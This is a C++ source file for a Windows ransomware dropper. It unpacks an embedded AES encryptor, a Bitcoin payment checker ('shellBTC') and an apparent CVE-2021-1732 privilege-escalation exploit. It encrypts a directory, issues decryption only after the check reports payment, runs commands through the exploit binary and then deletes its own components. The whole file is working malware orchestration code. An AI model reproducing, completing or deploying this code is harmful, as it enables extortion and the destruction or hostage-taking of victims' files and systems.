#include <windows.h>
#include <fstream>
#include <filesystem>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include "resource.h"

namespace fs = std::filesystem;

// === Global paths ===
const std::string controlDir = "C:\\EncControl";
const std::string aesPath = controlDir + "\\AES.exe";
const std::string logPath = controlDir + "\\encrypt_service.log";
const std::string instructionPath = controlDir + "\\instruction.txt";
const std::string targetDirPath = controlDir + "\\target_dir.txt";

std::string tempDir = fs::temp_directory_path().string();
std::string consoleAppPath = tempDir + "ConsoleApplication2.exe";
std::string shellBTCPath = tempDir + "shellBTC.exe";
std::string cveExePath = tempDir + "CVE-2021-1732.exe";

// === Cleanup logic ===
void kill_processes() {
    system("taskkill /IM AES.exe /F >nul 2>&1");
    system("taskkill /IM ConsoleApplication2.exe /F >nul 2>&1");
    system("taskkill /IM encserv.exe /F >nul 2>&1");
}

void safe_delete(const std::string& path) {
    std::error_code ec;
    fs::remove(path, ec);
}

void clean_directory(const std::string& dirPath) {
    std::error_code ec;
    for (const auto& entry : fs::directory_iterator(dirPath, ec)) {
        fs::remove_all(entry.path(), ec);
    }
}

// === Handler for Ctrl+C or close ===
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_CLOSE_EVENT ||
        signal == CTRL_LOGOFF_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
        std::cout << "[CLEANUP] Caught termination. Killing AES-related processes..." << std::endl;
        kill_processes();
    }
    return TRUE;
}

// === File I/O ===
void write_to_file(const std::string& path, const std::string& content) {
    std::ofstream file(path, std::ios::trunc);
    if (!file) {
        std::cerr << "[ERROR] Failed to write file: " << path << std::endl;
    } else {
        file << content;
        file.close();
        std::cout << "[INFO] Written to: " << path << std::endl;
    }
}

bool extract_resource_to_file(int resourceID, const std::string& filename) {
    HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(nullptr, hRes);
    DWORD size = SizeofResource(nullptr, hRes);
    void* pData = LockResource(hData);

    std::ofstream out(filename, std::ios::binary);
    if (!out) return false;

    out.write(static_cast<const char*>(pData), size);
    out.close();
    return true;
}

bool run_exe_and_wait(const std::string& exePath, DWORD& exitCode, bool showConsole = false) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    DWORD creationFlags = showConsole ? CREATE_NEW_CONSOLE : CREATE_NO_WINDOW;

    if (!CreateProcessA(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, creationFlags, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[ERROR] Failed to run: " << exePath << std::endl;
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool run_exe_background(const std::string& exePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[ERROR] Failed to start in background: " << exePath << std::endl;
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool run_command_via_cve(const std::string& cvePath, const std::string& cmd) {
    std::string fullCmd = "\"" + cvePath + "\" \"cmd.exe /C " + cmd + "\"";
    std::wstring wcmd(fullCmd.begin(), fullCmd.end());

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessW(nullptr, &wcmd[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[ERROR] Failed to launch CVE process." << std::endl;
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int main() {
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        std::cerr << "[ERROR] Could not set control handler" << std::endl;
        return 1;
    }

    std::string userTarget;

    try {
        std::cout << "[INPUT] Enter directory to encrypt: ";
        std::getline(std::cin, userTarget);

        // Ensure folder exists
        if (!fs::exists(controlDir)) {
            if (!fs::create_directory(controlDir)) {
                std::cerr << "[ERROR] Failed to create directory: " << controlDir << std::endl;
                return 1;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(250));
        }

        // === Write base files ===
        write_to_file(logPath, "");
        write_to_file(instructionPath, "ENCRYPT");
        write_to_file(targetDirPath, userTarget);

        // === Extract AES to C:\EncControl ===
        if (!extract_resource_to_file(IDR_AES_EXE, aesPath)) {
            std::cerr << "[ERROR] Failed to extract AES.exe" << std::endl;
            return 1;
        }

        // === Extract tools to %TEMP% ===
        if (!extract_resource_to_file(IDR_CONSOLE_APP_EXE, consoleAppPath)) return 1;
        if (!extract_resource_to_file(IDR_SHELLBTC_EXE, shellBTCPath)) return 1;
        if (!extract_resource_to_file(IDR_CVE_EXE, cveExePath)) return 1;

        // === Run AES background service ===
        std::cout << "[INFO] Starting AES background service..." << std::endl;
        if (!run_exe_background(consoleAppPath)) return 1;
        std::this_thread::sleep_for(std::chrono::seconds(2));

        // === Run shellBTC and check result ===
        DWORD btcExit;
        std::cout << "[INFO] Running shellBTC.exe..." << std::endl;
        if (!run_exe_and_wait(shellBTCPath, btcExit, true)) return 1;

        if (btcExit == 1) {
            std::cout << "[INFO] Payment received. Issuing DECRYPT..." << std::endl;
            std::string decryptCmd =
                "echo DECRYPT > \"" + instructionPath + "\" && echo " + userTarget + " > \"" + targetDirPath + "\"";

            if (!run_command_via_cve(cveExePath, decryptCmd)) {
                std::cerr << "[ERROR] CVE failed to write DECRYPT." << std::endl;
                return 1;
            }

            // === WAIT for AES to read DECRYPT ===
            std::cout << "[WAIT] Waiting 8 seconds for AES to read DECRYPT..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(8));
        } else {
            std::cout << "[INFO] No decryption triggered." << std::endl;
        }

        // === Final cleanup ===
        std::cout << "[INFO] Killing AES and related processes..." << std::endl;
        kill_processes();

        std::cout << "[WAIT] Waiting 5 seconds for shutdown..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));

        std::cout << "[INFO] Cleaning up files..." << std::endl;
        safe_delete(consoleAppPath);
        safe_delete(shellBTCPath);
        safe_delete(cveExePath);

        clean_directory(controlDir);
        std::error_code ec;
        fs::remove(controlDir, ec);

        std::cout << "[INFO] Dropper complete. Cleanup done." << std::endl;

    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << std::endl;
        kill_processes();
        return 1;
    }

    return 0;
}